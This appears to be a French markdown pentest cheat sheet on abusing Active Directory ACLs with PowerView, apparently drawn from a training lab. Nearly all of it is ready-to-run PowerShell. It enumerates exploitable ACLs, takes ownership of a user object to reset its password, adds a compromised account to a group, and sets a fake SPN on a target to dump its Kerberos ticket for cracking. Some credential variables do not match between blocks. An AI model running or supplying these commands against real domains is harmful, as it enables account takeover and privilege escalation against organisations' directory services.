---
public: true # set to true to make the article publishable
---

## Enumération des ACLs
```powershell
. .\PowerView.ps1
# ACLs intéressantes (très long)
Find-InterestingDomainAcl

# ACLs liées à un compte spécifique ($targetUserName)
$sid = Convert-NameToSid $targetUserName 
# peu prendre beaucoup de temps (plusieures minutes vois dizaines de minutes)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

## Exploitation de privilèges en notre possession

### WriteOwner (appropriation d'un objet)

Permet de s'approprier un objet pour ensuite accéder à ses propriétés en lecture / modification


### ForceChangePassword (modification du mot de passe)
```powershell title="Réinitialisation du mot de passe AD via appropriation de l'objet utilisateur cible"

# Appropriation d'un utilisateur (lorsqu'on a un droit WriteOwner référencé dans Bloodhound)
Set-DomainObjectOwner -Identity $targetUser -OwnerIdentity source_user
# Ajout d'une ACL sur le compte approprié pour réinitialiser le password :
Add-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -Rights ResetPassword

# Réinitialisation du password
$pass = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
Set-DomainUserPassword -Identity Target_AD_User -Password $pass
```

```powershell

#########################################################
# Add compromised user to Group
# requirement : need GenericWrite right on the targetted group
$clearPass = "P@ssw0rd"
$user = "INLANEFREIGHT\userWithGenericAllRight"
$cred_damundsen = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $clearPass -AsPlainText -Force))

Add-DomainGroupMember -Identity "Help Desk Level 1" -Members wley -Credential $cred_damundsen
# Verification
Get-DomainGroupMember -Identity "Help Desk Level 1" | ?{$_.MemberName -eq 'wley'}

#########################################################
# Create fake SPN for targetted user 'adunn' and dump TGS
$targetedUser = 'adunn'
# SPN Creation
Set-DomainObject -Credential $cred_wley -Identity $targetedUser -SET @{serviceprincipalname='nonexistent1/BLAHBLAH'}
# TGS collect
Get-DomainUser $targetedUser | Get-DomainSPNTicket -Credential $cred_wley | fl
# Cleanup
Set-DomainObject -Credential $Cred -Identity $targetedUser -Clear serviceprincipalname



```